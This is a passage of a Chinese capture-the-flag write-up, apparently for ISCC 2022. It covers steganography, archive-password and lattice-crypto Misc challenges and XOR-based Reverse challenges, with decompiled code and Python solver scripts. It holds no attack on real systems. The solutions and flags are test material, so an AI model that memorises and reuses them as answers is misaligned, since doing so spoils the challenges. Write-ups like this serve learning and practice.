        <span class="token keyword">if</span> ip <span class="token keyword">and</span> word<span class="token punctuation">:</span>
            <span class="token keyword">if</span> word <span class="token keyword">in</span> ip<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">judge_ip</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>waf1<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Fasle
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        addr <span class="token operator">=</span> addr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        ipp <span class="token operator">=</span> base64<span class="token punctuation">.</span>encodestring<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
        ipp <span class="token operator">=</span> ipp<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>ip<span class="token operator">==</span>ipp<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">global</span> control_key
            control_key <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
</code></pre>
<h1><a id="Misc_260"></a>Misc</h1>
<h2><a id="_261"></a>单板小将苏翊鸣</h2>
<h3><a id="_262"></a>解题步骤</h3>
<p>改图片高度得到二维码，扫码回答问题</p>
<h3><a id="_264"></a>详细描述</h3>
<p>010editor更改图片高度<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1037568e599b42b49d38b5269a5ecaec.png"/><br/> 扫码后unicode解码</p>
<p>在这次冬奥会的舞台上，我国小将苏翊鸣斩获一金一银，那你知道此次冬奥会我国总共获得几枚奖牌吗？又分别是几金几银几铜呢？<br/> 15个牌9金4银2铜<br/> 15942为压缩包密码<br/> 解压得到flag</p>
<h3><a id="_273"></a>解题收获</h3>
<p>中国NB！！！</p>
<h2><a id="2022_275"></a>2022冬奥会</h2>
<h3><a id="_276"></a>解题步骤</h3>
<p>改高，unicode解码，得到密码解压得到flag</p>
<h3><a id="_278"></a>详细描述</h3>
<p>修改高度<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cad18e971c6d431eb1ea0ee39e1e0532.png"/><br/> 翻译：冰墩墩的小伙伴经常被人冷落，你知道它的原型是什么吗?</p>
<p>吉祥物（压缩包密码）为灯笼，解压得到flag</p>
<h3><a id="_286"></a>解题收获</h3>
<p>中国还是NB！！！</p>
<h2><a id="_288"></a>隐秘的信息</h2>
<h3><a id="_289"></a>解题步骤</h3>
<p>lsb三0能发现一段hex，转二进制去头即可食用</p>
<h3><a id="_291"></a>详细描述</h3>
<p>压缩包密码为题干的base64解密<br/> 解出来的图片lsb分析能看到<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f89c4119eb2c4810aad7bbdb2a952216.png"/></p>
<p>直接hex转文本是一堆乱码<br/> 但是转二进制时细看可以发现<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/647750a2f5f6499dba893fec30f1cff1.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e9ca113fd19745c19a50fc7b884accca.png"/></p>
<p>刚好是ISCC，删除前面多余的数字再通过二进制转文本就能得到flag<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0666f555e7f244b780e83a366704065d.png"/></p>
<h3><a id="_303"></a>解题收获</h3>
<p>去了头都能吃</p>
<h2><a id="_306"></a>降维打击</h2>
<h3><a id="_307"></a>解题步骤</h3>
<p>foremost接zsteg加上二次元就有flag了</p>
<h3><a id="_309"></a>详细描述</h3>
<p>foremost -T分解得到两张图片<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c5c54f606d2a4fa1b497a58b114d44a8.png"/></p>
<p>zsteg -a 分析发现还有一张png<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7485adfa801e4e848bb7f915c0d22354.png"/>提取图片<br/> <code>zsteg -e b1,r,lsb,yx 00000567.png -&gt;res.png</code><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/fb9b8f63710d4effaa635a676c90015e.png"/></p>
<p>根据图片为《魔女之旅》的人物搜到<a href="https://www.bilibili.com/read/cv8724055">《魔女之旅》文字破解·印刷体</a><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/33eb3bd7d35c46a1b093a960d7e4a292.png"/><br/> 大写，四个一组，用<code>-</code>隔开</p>
<h3><a id="_321"></a>解题收获</h3>
<p>看到图片直接梭，所有工具一把梭</p>
<h2><a id="1_323"></a>藏在星空中的诗-1</h2>
<h3><a id="_324"></a>解题步骤</h3>
<p>ps打开psd发现有两个图层，更改完透明度得到排列顺序（压缩包密码），解密拿到加密映射表，对应出来既是flag</p>
<h3><a id="_326"></a>具体描述</h3>
<p>psd改透明度<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/37be43f9229f4a24b8a58f2f4ac3b039.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dc2f2ca38c2c4460b50a99ec6b5b7b03.png"/><br/> 讲五段星星按13524的顺序排列得到压缩包密码<br/> 解压得到哦excel表格<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/52a449977830416da0ef54d8cbda4c91.png"/><br/> 映射1-5得到flag</p>
<h3><a id="_334"></a>解题收获</h3>
<p>密文当密码可还行，13524当密码试了老半天了<br/> 映射的话，CTRL+F永远滴神</p>
<h2><a id="2_337"></a>藏在星空中的诗-2</h2>
<h3><a id="_338"></a>解题步骤</h3>
<p>因为是一套题，第一题的密码表肯定是有用的，找到规律解密就出来了</p>
<h3><a id="_340"></a>具体描述</h3>
<p>一开始先转的ascii，没规律的哇<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/29205177b0944b768185f642866c75c3.png"/><br/> 上个厕所，脑洞大开的哇！<br/> 根据第一题转字符后无视前四位<br/> 然后根据unicode编码最后一位获取十六进制值<br/> 例：</p>
<table><thead><tr><th>英文</th><th>Unicode</th><th>最后一位</th></tr></thead><tbody><tr><td>P</td><td>U+2734</td><td>4</td></tr><tr><td>U</td><td>U+1F7C9</td><td>9</td></tr></tbody></table>
<p>即<code>✴🟉</code>=<code>PU</code>=<code>49H</code>=<code>73D</code>=ascii的<code>I</code></p>
<p>附一个python脚本</p>
<pre><code class="prism language-python">a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PU'</span><span class="token punctuation">,</span><span class="token string">'ED'</span><span class="token punctuation">,</span><span class="token string">'PD'</span><span class="token punctuation">,</span><span class="token string">'PD'</span><span class="token punctuation">,</span><span class="token string">'KB'</span><span class="token punctuation">,</span><span class="token string">'=U'</span><span class="token punctuation">,</span><span class="token string">'EK'</span><span class="token punctuation">,</span><span class="token string">'FK'</span><span class="token punctuation">,</span><span class="token string">'KE'</span><span class="token punctuation">,</span><span class="token string">'P='</span><span class="token punctuation">,</span><span class="token string">'=B'</span><span class="token punctuation">,</span><span class="token string">'DP'</span><span class="token punctuation">,</span><span class="token string">'D{'</span><span class="token punctuation">,</span><span class="token string">'DP'</span><span class="token punctuation">,</span><span class="token string">'FE'</span><span class="token punctuation">,</span><span class="token string">'D{'</span><span class="token punctuation">,</span><span class="token string">'ET'</span><span class="token punctuation">,</span><span class="token string">'DH'</span><span class="token punctuation">,</span><span class="token string">'F='</span><span class="token punctuation">,</span><span class="token string">'KH'</span><span class="token punctuation">]</span>

s1<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ={}'</span><span class="token punctuation">)</span>
s2<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'dbf356ad167abef4fc70903604281'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> s <span class="token keyword">in</span> a<span class="token punctuation">:</span>
   flag1<span class="token operator">=</span>s2<span class="token punctuation">[</span>s1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
   flag2<span class="token operator">=</span>s2<span class="token punctuation">[</span>s1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
   flag<span class="token operator">=</span><span class="token punctuation">(</span>flag1<span class="token operator">+</span>flag2<span class="token punctuation">)</span>
   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
</code></pre>
<p>我的flag太丑啦<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/01aedd9572a0408abad747faa2d52d23.png"/></p>
<h3><a id="_370"></a>解题收获</h3>
<p>真的有这么丑的flag吗？<br/> 做题找不到规律的话，不如先去上个厕所，一下子就想出来了哇</p>
<h2><a id="_373"></a>套中套</h2>
<h3><a id="_374"></a>解题思路</h3>
<p>根据图片找到压缩包密码，在通过积累和特征搞到解密脚本，往里一扔</p>
<h3><a id="_376"></a>具体描述</h3>
<p>得到密码1</p>
<p>图片最后一段的base64解密得到密码2<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/69762cb818ca4ab6ab61ffb892163be9.png"/>拼接得到压缩包密码：<code>wELC0m3_T0_tH3_ISCC_Zo2z</code></p>
<p>python跑的话是一堆flag文件，当然，全是假的<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/631c26ab22c645dbb8a05d36b62f2120.png"/></p>
<p>继续看加密函数和其他文件<br/> pub.key文件是一堆数字的列表<br/> generator.py里有<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/654e4189691c42f6bc9d7cd850873dff.png"/><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3c6f96b4a67648aa901b7e1dde3a3b05.png"/><br/> 嗯搞一下</p>
<pre><code class="prism language-python">pubkey<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
nbit<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>nbit<span class="token punctuation">)</span>
encoded<span class="token operator">=</span>enc
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span>
A<span class="token operator">=</span>Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span>nbit<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>nbit<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">:</span>
    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">:</span>
    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>nbit<span class="token punctuation">]</span><span class="token operator">=</span>pubkey<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
A<span class="token punctuation">[</span>nbit<span class="token punctuation">,</span>nbit<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span>

res<span class="token operator">=</span>A<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>nbit<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    M<span class="token operator">=</span>res<span class="token punctuation">.</span>row<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    flag<span class="token operator">=</span><span class="token boolean">True</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> M<span class="token punctuation">:</span>
        <span class="token keyword">if</span> m <span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> m <span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>
            flag<span class="token operator">=</span><span class="token boolean">False</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>M<span class="token punctuation">)</span>
M<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> M<span class="token punctuation">)</span>
M<span class="token operator">=</span>M<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
M<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span>

</code></pre>
<p>代入pub.Key和enc.txt<br/> 在<a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a>解密<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/66f310e0843447a7a879d4a0a127ac2d.png"/><br/> hex解密<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/17c618be384a4d7dab220e7ceeda7a26.png"/></p>
<h3><a id="_427"></a>解题收获</h3>
<p>百度一下，可能知道</p>
<h2><a id="_430"></a>真相只有一个</h2>
<h3><a id="_431"></a>解题步骤</h3>
<p>图片lsb+爆破得到密码，流量包提取音频，音频结尾有摩斯，摩斯当密码snow解密flag.txt</p>
<h3><a id="_433"></a>详细描述</h3>
<p>Stegsolve打开，lsb三0<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/463af00f8c014fa8bf1766faf6ab6604.png"/>flag.txt<br/> 后面有空格符和制表位，先放一个snow隐写在这里，密码未知<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/27b6710dbf464d32a0e5bb7a0899d541.png"/><br/> 密码后面四个找不到<br/> 拿去爆破得到19981111<br/> 四个1，出题人善良<br/> 解压得到一个流量包，提取passwd.mp3<br/> <img alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/5eb0c6ed12b544edae7376237bdee074.png" src="https://img-blog.csdnimg.cn/14f873f7e32e424eb4388d60684fe695.png"/><br/> passwd.mp3最后是isccmisc的摩斯<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1c745a2026604f92a35cdee1bcac90a8.png"/><br/> snow解密<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f82673c4ffbb41778fce4c389cfe6e55.png"/></p>
<h3><a id="_447"></a>解题收获</h3>
<p>遇事不决就爆破<br/> 流量包提取mp3第一次见，知识点+1</p>
<h1><a id="Reverse_450"></a>Reverse</h1>
<h2><a id="GetTheTable_451"></a>GetTheTable</h2>
<h3><a id="_452"></a>解题步骤</h3>
<p>flag甩脸上了</p>
<h3><a id="_454"></a>详细描述</h3>
<p>ida打开<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/db928758affb43af99840f558451308d.png"/><br/> base58的表<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5ea9f4b31a224f79a48395b907a7dbaa.png"/></p>
<h3><a id="_459"></a>解题收获</h3>
<p>分数+40</p>
<h2><a id="Amys_Code_462"></a>Amy’s Code</h2>
<h3><a id="_463"></a>解题步骤</h3>
<p>找俩函数就能出</p>
<h3><a id="_465"></a>具体描述</h3>
<p>32位ida打开<br/> 两个加密函数<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/208732e0fccd4ae991182909352f1b9f.png"/><br/> 先异或</p>
<pre><code class="prism language-cpp"><span class="token keyword">int</span> __cdecl <span class="token function">sub_4128A0</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>Str<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+D0h] [ebp-14h]</span>
  <span class="token keyword">signed</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">j__strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{<!-- --></span>
    result <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&gt;=</span> v3 <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> i<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>再相加</p>
<pre><code class="prism language-cpp"><span class="token keyword">int</span> __cdecl <span class="token function">sub_412550</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>Str<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+D0h] [ebp-14Ch]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-140h]</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+E8h] [ebp-134h] BYREF</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+168h] [ebp-B4h]</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+174h] [ebp-A8h] BYREF</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+18Ch] [ebp-90h]</span>
  __int16 v8<span class="token punctuation">;</span> <span class="token comment">// [esp+190h] [ebp-8Ch]</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+19Ch] [ebp-80h]</span>

  v9<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">149</span><span class="token punctuation">;</span>
  <span class="token comment">//略</span>
  v9<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">184</span><span class="token punctuation">;</span>
	<span class="token comment">//略</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"LWHFUENGDJGEFHYDHIGJ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token function">j__strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j__memset</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x78u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
  <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>先减再异或得到flag</p>
<pre><code class="prism language-python">v9<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">20</span>
flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">20</span>
v9<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">149</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">169</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">137</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">134</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">212</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">188</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">177</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">184</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">177</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">197</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">192</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">179</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">153</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">168</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">145</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">189</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">107</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">138</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">146</span><span class="token punctuation">;</span>
v9<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">184</span><span class="token punctuation">;</span>

v6<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'LWHFUENGDJGEFHYDHIGJ'</span><span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
     flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>i
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>

</code></pre>
<h3><a id="_556"></a>解题收获</h3>
<p>标准的xor</p>
<h2><a id="How_decode_558"></a>How_decode</h2>
<h3><a id="_559"></a>解题步骤</h3>
<p>根进main函数发现加密函数的特征，修改现有脚本即可</p>
<h3><a id="_561"></a>详细描述</h3>
<p>查找main函数</p>
<pre><code class="prism language-cpp"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rsp</span>
  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-60h] BYREF</span>
  <span class="token keyword">int</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+A0h] [rbp+20h] BYREF</span>
  <span class="token keyword">char</span> v<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp+30h] BYREF</span>
  <span class="token keyword">int</span> n<span class="token punctuation">;</span> <span class="token comment">// [rsp+DCh] [rbp+5Ch]</span>
  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>p_v1<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+E0h] [rbp+60h]</span>
  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+E8h] [rbp+68h]</span>
  <span class="token keyword">int</span> n1<span class="token punctuation">;</span> <span class="token comment">// [rsp+F4h] [rbp+74h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+F8h] [rbp+78h]</span>
